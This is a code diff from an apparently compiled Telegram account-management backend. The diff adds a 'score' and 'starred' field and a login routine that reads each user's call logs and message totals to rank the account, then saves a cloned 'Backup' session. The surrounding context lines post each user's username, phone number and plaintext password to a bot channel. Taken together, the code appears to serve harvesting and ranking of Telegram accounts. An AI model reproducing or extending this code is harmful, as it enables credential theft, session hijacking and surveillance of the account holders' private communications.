@@ -11955,6 +11955,8 @@ let TgSignupService = TgSignupService_1 = class TgSignupService {
                 },
                 contacts: 0,
                 movieCount: 0,
+                score: 0,
+                starred: false,
                 msgs: 0,
                 photoCount: 0,
                 videoCount: 0,
@@ -31108,6 +31110,8 @@ class CreateUserDto {
         this.ownPhotoCount = 0;
         this.ownVideoCount = 0;
         this.contacts = 0;
+        this.starred = false;
+        this.score = 0;
         this.calls = {
             totalCalls: 0,
             outgoing: 0,
@@ -31211,6 +31215,14 @@ __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
     __metadata("design:type", Number)
 ], CreateUserDto.prototype, "contacts", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'Starred status', example: false }),
+    __metadata("design:type", Boolean)
+], CreateUserDto.prototype, "starred", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)({ description: 'User score', example: 0 }),
+    __metadata("design:type", Number)
+], CreateUserDto.prototype, "score", void 0);
 __decorate([
     (0, swagger_1.ApiPropertyOptional)({
         description: 'Per-chat call statistics',
@@ -31415,6 +31427,19 @@ __decorate([
     (0, class_validator_1.IsNumber)(),
     __metadata("design:type", Number)
 ], SearchUserDto.prototype, "ownVideoCount", void 0);
+__decorate([
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by starred status', type: Boolean }),
+    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
+    (0, class_validator_1.IsOptional)(),
+    (0, class_validator_1.IsBoolean)(),
+    __metadata("design:type", Boolean)
+], SearchUserDto.prototype, "starred", void 0);
+__decorate([
+    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by score' }),
+    (0, class_validator_1.IsOptional)(),
+    (0, class_validator_1.IsNumber)(),
+    __metadata("design:type", Number)
+], SearchUserDto.prototype, "score", void 0);
 
 
 /***/ },
@@ -31524,6 +31549,8 @@ let User = class User {
         this.twoFA = false;
         this.expired = false;
         this.password = null;
+        this.starred = false;
+        this.score = 0;
     }
 };
 exports.User = User;
@@ -31644,6 +31671,16 @@ __decorate([
     (0, mongoose_1.Prop)(),
     __metadata("design:type", Number)
 ], User.prototype, "contacts", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)(),
+    (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
+    __metadata("design:type", Boolean)
+], User.prototype, "starred", void 0);
+__decorate([
+    (0, swagger_1.ApiProperty)(),
+    (0, mongoose_1.Prop)({ required: false, type: Number, default: 0 }),
+    __metadata("design:type", Number)
+], User.prototype, "score", void 0);
 __decorate([
     (0, swagger_1.ApiProperty)(),
     (0, mongoose_1.Prop)({
@@ -32084,6 +32121,7 @@ const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
 const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
 const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
 const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
+const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
 let UsersService = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
@@ -32103,9 +32141,17 @@ let UsersService = class UsersService {
             await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
             setTimeout(async () => {
                 try {
-                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+                    const telegramClient = await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+                    const calllogs = await telegramClient.getCallLogStats();
+                    let score = 1;
+                    for (const callData of calllogs.chats) {
+                        const messages = await telegramClient.getMessages(callData.chatId, 2);
+                        score = score + (messages.pagination.total || 0) * (callData.totalCalls + 1) * (callData.averageDuration + 1);
+                        await (0, Helpers_1.sleep)(1000);
+                    }
+                    this.updateByFilter({ mobile: user.mobile }, { score: score });
                     const newSession = await this.telegramService.createNewSession(user.mobile);
-                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
+                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup", score: score });
                     await newUserBackup.save();
                 }
                 catch (error) {
